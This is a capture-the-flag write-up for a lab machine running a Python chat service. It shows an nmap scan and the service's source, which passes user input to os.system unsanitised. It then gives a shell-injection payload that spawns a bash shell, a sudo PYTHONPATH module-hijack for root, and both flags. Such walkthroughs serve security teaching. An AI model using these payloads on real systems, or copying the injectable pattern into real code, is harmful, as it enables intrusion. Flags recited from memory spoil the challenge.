
Link - "https://tryhackme.com/room/jpgchat"

> Exploiting poorly made custom chatting service written in a certain language...

# Hack into the machine and retrieve the flag

Nmap Scan Result - 
```shell

$ sudo nmap -sCV 10.10.99.43

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 15:54 BST
Nmap scan report for 10.10.99.43
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)

3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)


1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=9/3%Time=68B85999%P=x86_64-pc-linux-gnu%r(NUL
SF:L,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x20s
SF:ervice\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSAGE
SF:\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(currently
SF:\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\x20r
SF:eport\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(Gene
SF:ricLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20th
SF:is\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\n
SF:MESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(cu
SF:rrently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20
SF:to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 770.07 seconds

```

Well, let's check the github page for the source code as mentioned above. 

"https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py"
```python

#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

Interesting, So the input is not sanitized properly. Which means we can break it and add some more commands to execute. 

For example - 

```
'; ls;#
```

- The first `'` closes the string that started after `-c`.
- `;` terminates the `echo` command.
- `ls` is our injected command, which now runs.
- Another `;` terminates our injected command.
- `#` is a bash comment character. It comments out everything after.

Let's modify the command - 

```
'; python3 -c "import pty;pty.spawn('/bin/bash')"; #
```
and we got an working shell.

```shell

wes@ubuntu-xenial:/$ id
uid=1001(wes) gid=1001(wes) groups=1001(wes)

wes@ubuntu-xenial:/$ pwd
/

wes@ubuntu-xenial:/$ cd /home/wes
wes@ubuntu-xenial:~$ ls
user.txt

wes@ubuntu-xenial:~$ cat user.txt
JPC{487030410a543503cbb59ece16178318}

```

**Q1. Establish a foothold and get user.txt**
	JPC{487030410a543503cbb59ece16178318}

```shell

wes@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py

```

```shell

$ cat /opt/development/test_module.py                                     

#!/usr/bin/env python3

from compare import *
print(compare.Str('hello', 'hello', 'hello'))

```

We are going to create a file named "compare.py" inside "/home/wes" with the following code - 

```
import os
os.system('/bin/bash')
```
A simple script to spawn a shell. As we can see from above if we run "test_module.py" it can call our 'compare.py' and spawn a root shell. For that, we have to add "/home/wes" to "PYTHONPATH".

```shell

$ pwd
/home/wes

$ touch comapre.py

$ echo "import os; os.system('/bin/bash')" > compare.py

$ chmod +x compare.py

$ export PYTHONPATH=/home/wes

$ sudo /usr/bin/python3 /opt/development/test_module.py
```
Boom.... We got the root shell.

**Q2. Escalate your privileges to root and read root.txt**
	JPC{665b7f2e59cf44763e5a7f070b081b0a}


! Happy Hacking !